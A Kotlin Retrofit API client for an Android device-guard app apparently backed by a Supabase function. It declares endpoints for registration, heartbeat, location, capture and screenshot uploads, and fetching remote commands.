package com.myandroidguard.app.api

import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import retrofit2.http.*
import okhttp3.OkHttpClient
import okhttp3.logging.HttpLoggingInterceptor
import java.util.concurrent.TimeUnit

object ApiClient {
    private const val BASE_URL = "https://dujrhpxczaulfcudmwmm.supabase.co/functions/v1/device-api/"

    private val client: OkHttpClient by lazy {
        OkHttpClient.Builder()
            .connectTimeout(30, TimeUnit.SECONDS)
            .readTimeout(30, TimeUnit.SECONDS)
            .addInterceptor(HttpLoggingInterceptor().apply {
                level = HttpLoggingInterceptor.Level.BODY
            })
            .build()
    }

    val service: DeviceApiService by lazy {
        Retrofit.Builder()
            .baseUrl(BASE_URL)
            .client(client)
            .addConverterFactory(GsonConverterFactory.create())
            .build()
            .create(DeviceApiService::class.java)
    }
}

interface DeviceApiService {
    @POST("auto-register")
    suspend fun autoRegister(@Body request: AutoRegisterRequest): AutoRegisterResponse

    @POST("heartbeat")
    suspend fun heartbeat(
        @Header("x-device-token") token: String,
        @Body request: HeartbeatRequest
    ): Map<String, Any>

    @POST("location")
    suspend fun sendLocation(
        @Header("x-device-token") token: String,
        @Body request: LocationUpdateRequest
    ): Map<String, Any>

    @POST("upload-capture")
    suspend fun uploadCapture(
        @Header("x-device-token") token: String,
        @Body request: CaptureUploadRequest
    ): Map<String, Any>

    @POST("upload-screenshot")
    suspend fun uploadScreenshot(
        @Header("x-device-token") token: String,
        @Body request: ScreenshotUploadRequest
    ): Map<String, Any>

    @GET("get-commands")
    suspend fun getCommands(
        @Header("x-device-token") token: String
    ): CommandsResponse
}